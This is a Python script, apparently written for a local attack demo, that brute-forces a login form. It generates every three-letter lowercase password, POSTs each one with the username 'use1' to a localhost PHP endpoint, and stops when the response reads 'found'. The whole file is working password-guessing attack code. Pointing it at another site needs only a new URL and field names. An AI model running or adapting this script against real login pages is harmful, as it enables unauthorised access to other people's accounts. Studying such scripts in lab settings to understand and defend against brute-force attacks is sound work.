import urllib
from urllib.request import urlopen

url = 'http://localhost/attack_demo/checkdata.php'
values = {'username': 'use1',
            'password': ''}

data = urllib.parse.urlencode(values)
data = data.encode('ascii')
#response = urlopen(url, data)
#response = str(response.read());
#response = response[2:len(response)-5]
#print(response=="found")
passlist = []
charlist = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

def makelist(n, f, s):
    if(f == n):
        passlist.append(s)
        return
    for c in charlist:
        makelist(n, f+1, s+c)
        
    
min_length = 3
max_length = 3
for i in range(min_length, max_length+1):
    makelist(i, 0, "")
print(len(passlist))
for i in range(0, len(passlist)):
    values['password'] = passlist[i]
    print(values)
    data = urllib.parse.urlencode(values)
    data = data.encode('ascii')
    response = urlopen(url, data)
    response = str(response.read());
    response = response[2:len(response)-5]
    if(response=="found"):
        password = passlist[i]
        break

print("Password is: ",password)


